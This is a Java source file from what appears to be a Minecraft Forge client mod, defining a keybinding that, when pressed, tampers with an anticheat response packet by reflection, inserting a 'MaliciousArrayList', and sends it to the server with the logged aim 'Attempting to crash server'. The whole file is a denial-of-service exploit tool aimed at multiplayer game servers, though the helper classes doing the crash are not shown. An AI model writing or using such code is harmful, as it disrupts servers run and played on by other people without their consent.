package net.benjaminurquhart.decitweaks;

import java.util.List;

import org.lwjgl.input.Keyboard;

import cpw.mods.fml.client.registry.ClientRegistry;
import cpw.mods.fml.common.eventhandler.SubscribeEvent;
import cpw.mods.fml.common.gameevent.InputEvent.KeyInputEvent;
import net.minecraft.client.settings.KeyBinding;

public class CrashKeybindListener {

	public static final KeyBinding KEY;
	
	static {
		KEY = new KeyBinding("key.crash", Keyboard.KEY_BACKSLASH, "key.categories.multiplayer");
		ClientRegistry.registerKeyBinding(KEY);
	}
	
    @SubscribeEvent
    public void onKeyInput(KeyInputEvent event) {
    	if(KEY.isPressed()) {
    		Decimated.log("Attempting to crash server...");
    		try {
    			List<String> fake = new MaliciousArrayList<String>();
    			FakeNetworkWrapper wrapper = Decimated.instance.getFakeDeciNetworkWrapper();
				wrapper.getHashListField().set(wrapper.getLatestAnticheatResponse(), fake);
				wrapper.sendToServer(wrapper.getLatestAnticheatResponse());
				Decimated.log("Packet sent");
    		}
    		catch(Exception e) {
    			Decimated.err("Failed to crash server");
    			e.printStackTrace();
    		}
    	}
    }
}
